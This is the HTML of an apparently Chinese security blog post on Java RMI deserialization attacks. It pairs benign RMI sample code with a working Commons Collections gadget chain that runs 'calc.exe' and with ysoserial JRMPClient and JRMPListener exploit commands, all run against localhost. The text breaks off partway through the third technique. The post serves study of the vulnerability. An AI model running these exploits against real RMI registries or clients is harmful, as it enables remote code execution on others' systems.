@@ -1,0 +1,887 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="白仁的博客" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="反序列化之RMI前段时间的反序列化都是介绍了怎么触发，怎么构造利用链进行命令执行。但是要达成RCE效果，这个R如何做到还得继续学习。 0x00 简介 JAVA本身提供了一种RPC框架RMI及Java 远程方法调用，可以在不同的Java 虚拟机之间进行对象间的通讯 。 RMI是基于JRMP协议实现的。下面是RMI的调用逻辑：   由上图可以看出RMI主要分为三部分：  RMI Registry注册中">
+<meta property="og:type" content="article">
+<meta property="og:title" content="反序列化之RMI">
+<meta property="og:url" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2020&#x2F;07&#x2F;25&#x2F;%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI&#x2F;index.html">
+<meta property="og:site_name" content="白仁的博客">
+<meta property="og:description" content="反序列化之RMI前段时间的反序列化都是介绍了怎么触发，怎么构造利用链进行命令执行。但是要达成RCE效果，这个R如何做到还得继续学习。 0x00 简介 JAVA本身提供了一种RPC框架RMI及Java 远程方法调用，可以在不同的Java 虚拟机之间进行对象间的通讯 。 RMI是基于JRMP协议实现的。下面是RMI的调用逻辑：   由上图可以看出RMI主要分为三部分：  RMI Registry注册中">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2020&#x2F;07&#x2F;25&#x2F;%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI&#x2F;1.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2020&#x2F;07&#x2F;25&#x2F;%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI&#x2F;6.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2020&#x2F;07&#x2F;25&#x2F;%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI&#x2F;2.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2020&#x2F;07&#x2F;25&#x2F;%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI&#x2F;3.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2020&#x2F;07&#x2F;25&#x2F;%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI&#x2F;7.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2020&#x2F;07&#x2F;25&#x2F;%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI&#x2F;4.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2020&#x2F;07&#x2F;25&#x2F;%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI&#x2F;8.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2020&#x2F;07&#x2F;25&#x2F;%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI&#x2F;5.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2020&#x2F;07&#x2F;25&#x2F;%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI&#x2F;19.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2020&#x2F;07&#x2F;25&#x2F;%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI&#x2F;9.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2020&#x2F;07&#x2F;25&#x2F;%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI&#x2F;10.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2020&#x2F;07&#x2F;25&#x2F;%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI&#x2F;11.png">
+<meta property="og:updated_time" content="2020-07-26T03:37:01.960Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2020&#x2F;07&#x2F;25&#x2F;%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI&#x2F;1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://bai-ren-1.github.io/2020/07/25/反序列化之RMI/"/>
+
+
+
+
+
+  <title>反序列化之RMI | 白仁的博客</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">白仁的博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://bai-ren-1.github.io/2020/07/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="白仁">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="白仁的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">反序列化之RMI</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-07-25T09:53:51+08:00">
+                2020-07-25
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/WEB%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
+                    <span itemprop="name">WEB安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="反序列化之RMI"><a href="#反序列化之RMI" class="headerlink" title="反序列化之RMI"></a>反序列化之RMI</h1><p>前段时间的反序列化都是介绍了怎么触发，怎么构造利用链进行命令执行。但是要达成RCE效果，这个R如何做到还得继续学习。</p>
+<h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h2><p> JAVA本身提供了一种<strong>RPC框架RMI</strong>及Java 远程方法调用，可以在不同的Java 虚拟机之间进行对象间的通讯 。 RMI是基于<strong>JRMP协议</strong>实现的。下面是RMI的调用逻辑： </p>
+<p><img src="/2020/07/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI/1.png" alt></p>
+<p>由上图可以看出RMI主要分为三部分：</p>
+<ul>
+<li>RMI Registry注册中心</li>
+<li>RMI Client 客户端</li>
+<li>RMI Server服务端</li>
+</ul>
+<h2 id="0x01-初探"><a href="#0x01-初探" class="headerlink" title="0x01 初探"></a>0x01 初探</h2><blockquote>
+<p>虽然这里RMI的三部分都是在本机上执行的，但是得理解好Remote表现在哪个地方。这里就直接贴代码，个人运行环境是JDK1.7.80版本。</p>
+</blockquote>
+<p>首先我们先看下普通利用RMI的每个部分的代码是怎么编写的以及其目录结构：</p>
+<p><img src="/2020/07/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI/6.png" alt></p>
+<blockquote>
+<p>这里定义了四个类和一个接口，从上到下分别代表着客户端、注册类、注册类接口、服务端和注册中心。</p>
+</blockquote>
+<h3 id="注册中心"><a href="#注册中心" class="headerlink" title="注册中心"></a>注册中心</h3><p>注册中心启动类Registry：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">package Rmi.Normal;</span><br><span class="line"></span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line">public class Registry &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            LocateRegistry.createRegistry(1099);</span><br><span class="line">        &#125; catch (RemoteException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        while (true) ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><p>远程接口HelloInterface：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public interface HelloInterface extends java.rmi.Remote &#123;</span><br><span class="line">    public String sayHello(String from) throws java.rmi.RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>远程接口实现类HelloImpl用来绑定到注册中心上：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public class HelloImpl extends UnicastRemoteObject implements HelloInterface &#123;</span><br><span class="line">    public HelloImpl() throws java.rmi.RemoteException &#123;</span><br><span class="line">        super();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String sayHello(String from) throws java.rmi.RemoteException &#123;</span><br><span class="line">        System.out.println(&quot;Hello from &quot; + from + &quot;!!&quot;);</span><br><span class="line">        return &quot;sayHello&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>服务端启动类HelloServer：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">package Rmi.Normal;</span><br><span class="line"></span><br><span class="line">import java.rmi.AlreadyBoundException;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line">public class HelloServer &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Registry registry = LocateRegistry.getRegistry(1099);</span><br><span class="line">            registry.bind(&quot;hello&quot;, new HelloImpl());</span><br><span class="line">        &#125; catch (RemoteException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; catch (AlreadyBoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><p>客户端启动类HelloClient：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">package Rmi.Normal;</span><br><span class="line"></span><br><span class="line">import java.rmi.NotBoundException;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line">public class HelloClient &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Registry registry = LocateRegistry.getRegistry(1099);</span><br><span class="line">            HelloInterface hello = (HelloInterface) registry.lookup(&quot;hello&quot;);</span><br><span class="line">            System.out.println(hello.sayHello(&quot;flag&quot;));</span><br><span class="line">        &#125; catch (NotBoundException | RemoteException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><p>按照执行注册中心 -&gt; 执行服务端 -&gt; 执行客户端顺序执行，可以看到以下的结果：</p>
+<p><img src="/2020/07/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI/2.png" alt></p>
+<p>服务端打印出了字符串”Hello from flag”，我们看客户端执行的结果：</p>
+<p><img src="/2020/07/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI/3.png" alt></p>
+<p>可见客户端执行了sayHello方法，打印出了方法中的字符串。</p>
+<h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h3><p>这里用自己的的话做一下过程描述：</p>
+<ul>
+<li>注册中心的代码通过<strong>createRegistry</strong>在1099端口开启了注册中心。</li>
+<li>服务端定义了一个要绑定到注册中心的实现类HelloImpl。</li>
+<li>服务端的代码通过getRegistry获取注册中心。</li>
+<li>服务端的代码通过<strong>bind</strong>将实现类绑定到注册中心为hello。</li>
+<li>客户端的代码通过getRegistry获取注册中心。</li>
+<li>客户端的代码通过<strong>lookup</strong>找到注册中心上绑定为hello的类然后调用sayHello。</li>
+</ul>
+<blockquote>
+<p>客户调用sayHello为什么是在客户端上执行？客户端只是获取了一个返回结果？</p>
+<p>这个就是一个重点：RMI服务端提供的方法，<strong>被调用的时候该方法是执行在服务端</strong> 。</p>
+</blockquote>
+<h2 id="0x02-打法"><a href="#0x02-打法" class="headerlink" title="0x02 打法"></a>0x02 打法</h2><p>介绍完RMI的调用过程，主要还是为这个篇章做好铺垫，实现在这个RMI调用过程来攻击远程机器？下面代码因为我没搭建依赖环境，还是按照CC链分析的博客把ysoserial-master-30099844c6-1作为依赖库引入。</p>
+<h4 id="服务端攻击注册中心"><a href="#服务端攻击注册中心" class="headerlink" title="服务端攻击注册中心"></a>服务端攻击注册中心</h4><p><img src="/2020/07/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI/7.png" alt></p>
+<blockquote>
+<p>这种攻击方式可以只涉及服务端和注册中心，所以这里只实现了这两个类而没有客户端类。</p>
+</blockquote>
+<p>服务端代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">package Rmi.ServerAttackRegistry;</span><br><span class="line"></span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import javax.management.BadAttributeValueExpException;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.lang.reflect.InvocationHandler;</span><br><span class="line">import java.lang.reflect.Proxy;</span><br><span class="line">import java.rmi.Remote;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class HelloServer &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        try &#123;</span><br><span class="line"></span><br><span class="line">            Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                    new ConstantTransformer(Runtime.class),</span><br><span class="line">                    new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;),</span><br><span class="line">                    new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;),</span><br><span class="line">                    new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc.exe&quot;&#125;),</span><br><span class="line">            &#125;;</span><br><span class="line">            Transformer transformer = new ChainedTransformer(transformers);</span><br><span class="line">            Map innerMap = new HashMap();</span><br><span class="line">            Map ouputMap = LazyMap.decorate(innerMap, transformer);</span><br><span class="line"></span><br><span class="line">            TiedMapEntry tiedMapEntry = new TiedMapEntry(ouputMap, &quot;pwn&quot;);</span><br><span class="line">            BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);</span><br><span class="line"></span><br><span class="line">            Field field = badAttributeValueExpException.getClass().getDeclaredField(&quot;val&quot;);</span><br><span class="line">            field.setAccessible(true);</span><br><span class="line">            field.set(badAttributeValueExpException, tiedMapEntry);</span><br><span class="line"></span><br><span class="line">            Map tmpMap = new HashMap();</span><br><span class="line">            tmpMap.put(&quot;pwn&quot;, badAttributeValueExpException);</span><br><span class="line">            Constructor&lt;?&gt; ctor = null;</span><br><span class="line">            ctor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">            ctor.setAccessible(true);</span><br><span class="line">            InvocationHandler invocationHandler = (InvocationHandler) ctor.newInstance(Override.class, tmpMap);</span><br><span class="line">            Remote remote = Remote.class.cast(Proxy.newProxyInstance(HelloServer.class.getClassLoader(), new Class[]&#123;Remote.class&#125;, invocationHandler));</span><br><span class="line">            Registry registry = LocateRegistry.getRegistry(1099);</span><br><span class="line">            registry.bind(&quot;hello1&quot;, remote);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>注册中心：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">package Rmi.ServerAttackRegistry;</span><br><span class="line"></span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line">public class Registry &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            LocateRegistry.createRegistry(1099);</span><br><span class="line">        &#125; catch (RemoteException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        while (true) ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>执行的结果如下，成功弹出了计算器：</p>
+<p><img src="/2020/07/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI/4.png" alt></p>
+<blockquote>
+<p>这里弹出的计算器是注册中心弹出来的。可以简单做个实验：单独运行服务端程序它会提示找不到注册中心。然后注释掉注册到注册中心的代码，直接执行代码也不会弹计算器，因为没有反序列化的触发点。</p>
+</blockquote>
+<p>然后我们就来总结第一种打法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RMI恶意服务端通过bind、unbind、rebind接口传输精心构造的类（传输过程是序列化数据的形式）到注册中心进行绑定，使注册中心接收到数据后进行反序列化操作从而被RCE</span><br></pre></td></tr></table></figure>
+
+<p>但这种攻击具有这些条件：</p>
+<ul>
+<li>JDK环境：6u141、7u131、80121、JEP290规范前/8u141前。</li>
+<li>注册中心的Java包种存在利用链。</li>
+<li>利用bind、unbind、rebind接口。</li>
+</ul>
+<h4 id="JRMP客户端攻击注册中心（服务端）"><a href="#JRMP客户端攻击注册中心（服务端）" class="headerlink" title="JRMP客户端攻击注册中心（服务端）"></a>JRMP客户端攻击注册中心（服务端）</h4><p><img src="/2020/07/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI/8.png" alt></p>
+<blockquote>
+<p>这种攻击方式利用到了ysoserial工具直接进行攻击注册中心，所以只要实现一个注册中心就可以攻击了。</p>
+</blockquote>
+<p>首先运行注册中心，然后使用下面命令执行ysoserial的payload，发起一次 JRMPClient攻击 ：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-master-30099844c6-1.jar ysoserial.exploit.JRMPClient 127.0.0.1 1099 CommonsCollections5 &quot;calc.exe&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI/5.png" alt></p>
+<p>可以看到运行之后注册中心（就是本机）被打出了一个计算器。</p>
+<blockquote>
+<p>这里也是演示了如果外网存在注册中心我们如何作为一个恶意JRMP客户端去使用ysoserial攻击注册中心。如果注册中心和服务端在同一台机器上实现的，那这种攻击也相当于<strong>JRMP客户端攻击服务端</strong>。</p>
+</blockquote>
+<p>于是总结第二种打法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">恶意JRMP客户端通过ysoserial工具构建JRMPClient就能攻击注册中心（可能同时是服务端）使其RCE</span><br></pre></td></tr></table></figure>
+
+<p>但这种攻击具有这些条件：</p>
+<ul>
+<li>JDK环境：6u141、7u131、80121、JEP290规范前。</li>
+<li>注册中心的Java包种存在利用链。</li>
+<li>利用lookup接口。</li>
+</ul>
+<h3 id="注册中心（JRMP服务端）攻击客户端"><a href="#注册中心（JRMP服务端）攻击客户端" class="headerlink" title="注册中心（JRMP服务端）攻击客户端"></a>注册中心（JRMP服务端）攻击客户端</h3><p><img src="/2020/07/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI/19.png" alt></p>
+<blockquote>
+<p>这种攻击方式利用到了ysoserial工具直接进行假装注册中心，这里是模拟受害者使用lookup（这里找到是hello但是还是会被攻击）就会被反序列化RCE。如果注册中心和服务端在同一台机器上实现的，那这种攻击也相当于<strong>JRMP服务端攻击客户端</strong>。</p>
+</blockquote>
+<p>首先使用下面命令执行ysoserial的payload， 启动一个恶意JRMP服务端 ：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-master-30099844c6-1.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections5 &quot;calc.exe&quot;</span><br></pre></td></tr></table></figure>
+
+<p>然后运行客户端的代码直接弹计算器，我惊了：</p>
+<p><img src="/2020/07/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI/9.png" alt></p>
+<p>于是总结第三种打法：</p>
